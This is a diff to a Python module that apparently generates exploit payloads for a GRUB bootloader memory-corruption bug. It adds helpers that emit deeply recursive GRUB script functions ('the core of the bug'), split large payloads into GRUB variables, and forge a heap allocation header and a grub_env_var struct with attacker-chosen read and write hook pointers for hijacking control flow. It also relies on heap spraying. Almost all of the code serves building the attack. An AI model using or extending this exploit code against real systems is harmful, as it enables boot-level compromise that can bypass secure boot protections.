@@ -1,12 +1,21 @@
+import struct
 from consts import HASHSZ, HASHVAL_SPRAY
 
-
+ALLOC_MAGIC = 0x6db08fa4
 MAGIC = b'# GRUB Environment Block\n'
 
 
 def pad(contents, size):
     pre = b'\x00'*(size - len(contents))
     return bytes(contents + pre)
+
+
+def pad_new(value, count=16, val=b'\x90', before=True):
+    left = count - len(value)
+    if before:
+        return left * val + value
+    else:
+        return value + left * val
 
 
 def env_block(vars):
@@ -17,13 +26,16 @@ def env_block(vars):
     res += MAGIC
     for key, value in vars.items():
         res += bytes(f'{key}=', 'ascii') + value
-    return pad(res, count=1024, val=b'#', before=False)
+    return pad_new(res, count=1024, val=b'#', before=False)
 
 
 def hashval(value):
     i = 0
     for c in value:
-        i += 5 * ord(c)
+        if isinstance(c, int):
+            i += 5 * c
+        else:
+            i += 5 * ord(c)
     return i % HASHSZ
 
 
@@ -86,3 +98,159 @@ def force_regions_to_exist(name='HEAP', expand=8, hashval=HASHVAL_SPRAY):
     res += var.unset()
 
     return res
+
+
+# Stolen functions from stackoverflow
+def chunks(lst, n):
+    """Yield successive n-sized chunks from lst."""
+    for i in range(0, len(lst), n):
+        yield lst[i:i + n]
+
+
+class bidict(dict):
+    def __init__(self, *args, **kwargs):
+        super(bidict, self).__init__(*args, **kwargs)
+        self.inverse = {}
+        for key, value in self.items():
+            self.inverse.setdefault(value, []).append(key)
+
+    def __setitem__(self, key, value):
+        if key in self:
+            self.inverse[self[key]].remove(key)
+        super(bidict, self).__setitem__(key, value)
+        self.inverse.setdefault(value, []).append(key)
+
+    def __delitem__(self, key):
+        self.inverse.setdefault(self[key], []).remove(key)
+        if self[key] in self.inverse and not self.inverse[self[key]]:
+            del self.inverse[self[key]]
+        super(bidict, self).__delitem__(key)
+
+
+class VarSplit:
+    CHUNK_SIZE = 1024
+
+    def __init__(self, body):
+        lchunks = [chunk for chunk in chunks(body, self.CHUNK_SIZE)]
+
+        counts = {}
+
+        for chunk in lchunks:
+            if chunk in counts:
+                counts[chunk] += 1
+            else:
+                counts[chunk] = 1
+
+        self._dedup_chunks = bidict({
+            f'p_{idx}': chunk for idx, chunk in enumerate(set(lchunks))
+        })
+
+        self._vars = ''
+        for chunk in lchunks:
+            a = self._dedup_chunks.inverse[chunk][0]
+            self._vars += f'${{{a}}}'
+
+    def setup(self):
+        res = []
+        for key, value in self._dedup_chunks.items():
+            res.append(f'set {key}={value}')
+        return res
+
+    def define(self, name):
+        return command(f'set {name}={self._vars}')
+
+    def clean(self, count):
+        res = []
+        for chunk in self._dedup_chunks:
+            res.append(f'unset {chunk}')
+        return res
+
+
+class Function:
+    def __init__(self, name):
+        self._name = name
+
+    def call(self, args=[]):
+        return [' '.join([self._name] + args)]
+
+    def define(self, body):
+        body_str = '    ' + '\n    '.join(body)
+        return [f'function {self._name} {{\n{body_str}\n}}']
+
+
+class RecursiveFuncs:
+    """
+    Essentially the core of the bug, functions that call another one like a
+    Matryoshka doll.
+    """
+
+    def __init__(self, name, count=32):
+        self._count = count
+        self._name = name
+        self._funcs = [
+            Function(f'{name}_{i:04}') for i in range(self._count + 1)
+        ]
+
+    def setup(self):
+        res = []
+        for i in range(1, self._count + 1):
+            res += self._funcs[i].define(
+                self._funcs[i - 1].call(['$1'])
+            )
+        return res
+
+    def define(self, func):
+        return self._funcs[0].define(func)
+
+    def call(self, depth, args):
+        if isinstance(depth, int):
+            return self._funcs[depth].call(args)
+        else:
+            arg = ' '.join(args)
+            return [f'{self._name}_${{{depth}}} {arg}']
+
+
+def while_loop(condition, body):
+    body_str = '    ' + '\n    '.join(body)
+    return [f'while [ { condition } ] ; do \n{ body_str }\ndone']
+
+
+def grub_mm_header_t(size):
+    """
+    create an allocated header
+    """
+    controlled = b''
+    # Chunk header
+    # the next value does not matter for allocated blocks, which will be fixed
+    # when free'd
+    controlled += struct.pack('<Q', 0x41424344)
+    controlled += struct.pack('<Q', size)
+    controlled += struct.pack('<Q', ALLOC_MAGIC)
+    # padding
+    controlled += b'Y'*8
+    return controlled
+
+
+def grub_env_var(str_address=0, read_hook=0, write_hook=0):
+    """
+    generate a grub_env_var struct
+    """
+    controlled = b''
+    controlled += struct.pack('<Q', str_address)
+    # -> value
+    controlled += struct.pack('<Q', 0)
+    # -> read_hook
+    controlled += struct.pack('<Q', read_hook)
+    # -> write_hook
+    controlled += struct.pack('<Q', write_hook)
+    # -> next
+    controlled += struct.pack('<Q', 0)
+    # -> prevp
+    controlled += struct.pack('<Q', 0)
+    # -> sorted_next
+    controlled += struct.pack('<Q', 0)
+    # -> global
+    controlled += struct.pack('<Q', 0)
+    # padding
+    controlled += struct.pack('<Q', 0)
+    return controlled
